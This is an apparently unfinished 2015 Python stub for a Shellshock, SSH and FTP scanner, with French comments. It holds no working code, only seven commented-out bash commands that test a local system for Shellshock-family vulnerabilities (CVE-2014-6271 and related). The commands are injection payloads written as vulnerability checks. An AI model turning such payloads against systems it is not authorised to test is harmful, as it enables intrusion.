#! /usr/bin/python

# objectif : 
#faire un scanner de shell shock 
# scanner un acces SSH ( eviter les honeys pots)
# scanner les ftps ? 
#



__author__ = "canillas"
__date__ = "$11 fevr. 2015 10:50:30$"

import sys
#import urllib2

def toto():
    print("hello")
    


#pris du git  sur shellshock 
def Scanner(url):
    
    return 0 
#def Base_Docu():
#   pureFTD // a tester https://gist.github.com/jedisct1/88c62ee34e6fa92c31dc

#Exploit 1 (CVE-2014-6271)

#There are a few different ways to test if your system is vulnerable to shellshock. Try running the following command in a shell.

#env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
#If you see "vulnerable" you need to update bash. Otherwise, you should be good to go.

#Exploit 2 (CVE-2014-7169)

#Even after upgrading bash you may still be vulnerable to this exploit. Try running the following code.

#env X='() { (shellshocker.net)=>\' bash -c "echo date"; cat echo; rm ./echo
#If the above command outputs the current date (it may also show errors), you are still vulnerable.

#Exploit 3 (???)

#Here is another variation of the exploit. Please leave a comment below if you know the CVE of this exploit.

#env X=' () { }; echo hello' bash -c 'date'
#If the above command outputs "hello", you are vulnerable.

#Exploit 4 (CVE-2014-7186)

#bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' ||
#echo "CVE-2014-7186 vulnerable, redir_stack"
#A vulnerable system will echo the text "CVE-2014-7186 vulnerable, redir_stack".

#Exploit 5 (CVE-2014-7187)

#(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash ||
#echo "CVE-2014-7187 vulnerable, word_lineno"
#A vulnerable system will echo the text "CVE-2014-7187 vulnerable, word_lineno".

#Exploit 6 (CVE-2014-6278)

#shellshocker='() { echo You are vulnerable; }' bash -c shellshocker
#You shouldn't see "You are vulnerable", if you're patched you will see "bash: shellshocker: command not found"

#Exploit 7 (CVE-2014-6277)

#bash -c "f() { x() { _;}; x() { _;} <<a; }" 2>/dev/null || echo vulnerable
#If the command outputs "vulnerable", you are vulnerable.

